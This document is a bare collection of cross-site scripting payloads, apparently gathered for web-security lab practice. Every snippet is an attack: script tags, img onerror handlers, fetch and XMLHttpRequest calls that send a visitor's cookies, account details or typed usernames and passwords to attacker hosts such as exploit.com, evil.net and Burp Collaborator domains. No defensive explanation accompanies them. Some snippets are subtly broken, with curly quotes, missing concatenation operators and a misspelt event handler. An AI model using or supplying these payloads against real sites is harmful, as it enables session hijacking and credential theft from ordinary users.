```Javascript
<script>
document.location='https://Collaborator.com/?cookiestealer='+document.cookie;
</script>
```

```Javascript
a"/><script>document.location='https://bc.oastify.com/cookiestealer.php?c='+document.cookie;</script>
```

```Javascript
document.location='https://burp-collab.x.com/cookiestealer.php?c='+document.cookie;
```

```Javascript
document.location='https://BurpCollaBoRaTor.oastify.com/?FreeCookies='+document.cookie;
```

```Javascript
/?evil='/><script>document.write('<img src="https://exploit.com/steal.MY?cookie=' document.cookie '" />')</script> 
```

```Javascript
GET /js/geolocate.js?callback=setCountryCookie&utm_content=foo;callback=document.location='http://BURPCOL.oastify.com/?StealCookies=' document.cookie ;//
```

```Javascript
<img src=x onerror=this.src=//exploit.net/?'+document.cookie;>
```

```Javascript
<script>
    document.location=""http://stock.lab.web-security-academy.net/?productId=4
            <script>
                    var req = new XMLHttpRequest(); 
                    req.onload = reqListener; 
                    req.open('get','https://lab.web-security-academy.net/accountDetails',true); 
                    req.withCredentials = true;
                    req.send();
                    function reqListener() {
                            location='https://exploit.web-security-academy.net/log?key='%2bthis.responseText;
                    };
            %3c/script>
            &storeId=1""
</script>
```

```Javascript
<script>
fetch(‘https://burpcollaborator.net’, {method: ‘POST’,mode: ‘no-cors’,body:document.cookie});
</script>
```

```Javascript
<script>
  fetch('https://COLLABORATOR.com', {
  method: 'POST',
  mode: 'no-cors',
  body:'PeanutButterCookies='+document.cookie
  }); 
</script>   
```

```Javascript
x"); var fuzzer=new Image;fuzzer.src="https://COLLABORATOR.com/?"+document.cookie; //
```

```Javascript
<script>fetch('https://hacker.thm/steal?cookie=' + btoa(document.cookie));</script>  
```

```Javascript
<script>new Image().src="http://Collaborator.COM/cool.jpg?output="+document.cookie;</script>
```

```Javascript
?productId=1&storeId="></select><img src=x onerror=this.src='http://exploit.bad/?'+document.cookie;>
```

```Javascript
<script>
document.write('<img src="http://exploit.net?cookieStealer='+document.cookie+'" />');
</script>
```

```Javascript
<img src=x onerror=this.src='http://exploit.bad/?'+document.cookie;>
```

```Javascript
<script>
fetch('https://BURP-COLLABORATOR', {
method: 'POST',
mode: 'no-cors',
body:document.cookie
});
</script>
```

>::::  Steal Password / Cookie Stealer ::::

>XMLHttpRequest

```html
<input name=username id=username>
<input type=password name=password id=password onhcange="CaptureFunction()">
<script>
function CaptureFunction()
{
var user = document.getElementById('username').value;
var pass = document.getElementById('password').value;
var xhr = new XMLHttpRequest();
xhr.open("GET", "https://exploit.com/?username=" + user + "&password=" + pass, true);
xhr.send();
}
</script>
```

>FETCH API

```Javascript
<input name=username id=username>
<input type=password name=password onchange="if(this.value.length)fetch('https://BURP-COLLABORATOR-SUBDOMAIN',{
method:'POST',
mode: 'no-cors',
body:username.value+':'+this.value
});">
```


>::::  DATA EXFILTRATION  /  COOKIE STEALER  ::::
```Javascript
  </textarea><script>fetch('http://exploit.evil?cookie=' + btoa(document.cookie) );</script> 
```

```Javascript
<script>document.write('<img src="http://evil.net/submitcookie.php?cookie=' + escape(document.cookie) + '" />');</script>
```

```Javascript
<script>
document.write('<img src="HTTPS://EXPLOIT.net/?c='+document.cookie+'" />');
</script>
```

```Javascript
<script>document.write('<img src="https://EXPLOIT.net/?c='%2bdocument.cookie%2b'" />');</script>
```